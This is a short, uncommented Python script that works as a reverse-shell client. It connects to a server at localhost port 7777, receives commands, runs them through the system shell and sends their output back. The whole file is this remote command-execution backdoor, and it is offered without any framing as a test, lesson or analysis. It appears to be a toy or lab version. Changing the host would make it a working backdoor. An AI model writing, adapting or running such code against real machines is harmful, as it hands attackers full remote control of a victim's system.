import socket
import subprocess

client = socket.socket()

try:
    client.connect(('localhost', 7777))
    client.send("1")

    while True:
        c = client.recv(1024)
        cmd = subprocess.Popen(c, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        client.send(cmd.stdout.read())
except Exception as e:
    print("Error: {}".format(e))